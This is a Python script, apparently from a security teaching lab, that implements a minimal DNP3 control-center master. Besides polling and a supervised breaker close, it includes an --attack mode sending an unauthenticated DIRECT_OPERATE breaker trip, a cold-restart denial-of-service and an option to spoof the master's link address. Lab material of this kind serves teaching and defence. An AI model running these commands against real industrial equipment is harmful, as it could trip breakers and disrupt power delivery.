#!/usr/bin/env python3
"""
master.py -- a minimal DNP3 master (control center) for the lab.

Polls the outstation and prints the decoded reply. Can also send a supervised
breaker close (SELECT then OPERATE) or -- in --attack mode -- an unauthenticated
DIRECT_OPERATE trip, so students can compare legitimate and malicious control.

Examples:
  python3 master.py --host dnp3-outstation                 # integrity poll
  python3 master.py --host dnp3-outstation --close         # SELECT+OPERATE close
  python3 master.py --host dnp3-outstation --attack         # inject a TRIP (no SELECT)
  python3 master.py --host dnp3-outstation --restart        # cold restart (DoS)
"""
import socket, struct, argparse, time
import dnp3lib as d

MASTER_ADDR = 100
OUTSTN_ADDR = 10


def decode_response(user):
    p = d.parse_app(user)
    if not p:
        return
    ac, func, name, objs = p
    print(f"  <- {name} (fc=0x{func:02x})")
    if func in (0x81, 0x82):     # responses carry a 2-byte IIN before objects
        objs = objs[2:]
    # very small object walker for the common response objects
    i = 0
    while i + 3 <= len(objs):
        g, v, q = objs[i], objs[i + 1], objs[i + 2]
        i += 3
        if g == 1 and v == 2:      # binary inputs, range 1-byte start/stop
            start, stop = objs[i], objs[i + 1]; i += 2
            pts = [objs[i + k] for k in range(stop - start + 1)]; i += len(pts)
            states = [(b >> 7) & 1 for b in pts]
            print(f"     binary inputs {start}-{stop}: {states}")
        elif g == 30 and v == 1:   # 32-bit analog with flag
            start, stop = objs[i], objs[i + 1]; i += 2
            vals = []
            for _ in range(stop - start + 1):
                flag = objs[i]; val = struct.unpack('<i', objs[i + 1:i + 5])[0]; i += 5
                vals.append(val)
            print(f"     analog inputs {start}-{stop}: {vals}")
        else:
            break


def send(sock, frame, label):
    sock.sendall(frame)
    print(f"  -> {label}")
    time.sleep(0.2)
    sock.settimeout(2.0)
    try:
        fr = d.read_frame(sock)
        if fr:
            decode_response(fr[3])
    except socket.timeout:
        print("     (no response)")


def main():
    global MASTER_ADDR
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=20000)
    ap.add_argument("--close", action="store_true", help="supervised breaker close (SELECT+OPERATE)")
    ap.add_argument("--attack", action="store_true", help="unauthenticated DIRECT_OPERATE trip")
    ap.add_argument("--restart", action="store_true", help="cold restart (availability attack)")
    ap.add_argument("--src-addr", type=int, default=MASTER_ADDR,
                    help="DNP3 link source address to send (default 100 = the master's; set differently to be "
                         "caught by a link-address allow-list, or keep 100 to spoof the master's DNP3 identity)")
    args = ap.parse_args()
    MASTER_ADDR = args.src_addr

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(3.0)                       # never block forever on connect
    try:
        s.connect((args.host, args.port))
    except OSError as e:
        print(f"[master] connect to {args.host}:{args.port} failed: {e}")
        return
    print(f"[master] connected to {args.host}:{args.port}")
    seq = 0

    # integrity poll
    send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, d.appctl(seq), 0x01, d.obj_class_poll()),
         "READ integrity poll (Class 1/2/3/0)")
    seq += 1

    if args.close:
        cr = d.crob(0, d.CROB_CLOSE_PULSE)
        send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, d.appctl(seq), 0x03, cr), "SELECT close breaker"); seq += 1
        send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, d.appctl(seq), 0x04, cr), "OPERATE close breaker"); seq += 1

    if args.attack:
        print("[master] *** sending UNAUTHENTICATED DIRECT_OPERATE trip (no SELECT) ***")
        cr = d.crob(0, d.CROB_TRIP_PULSE)
        send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, d.appctl(seq), 0x05, cr), "DIRECT_OPERATE TRIP breaker"); seq += 1

    if args.restart:
        print("[master] *** sending COLD RESTART ***")
        send(s, d.msg(d.CTRL_MASTER, OUTSTN_ADDR, MASTER_ADDR, seq, d.appctl(seq), 0x0D, b""), "COLD_RESTART"); seq += 1

    s.close()
    print("[master] done")


if __name__ == "__main__":
    main()
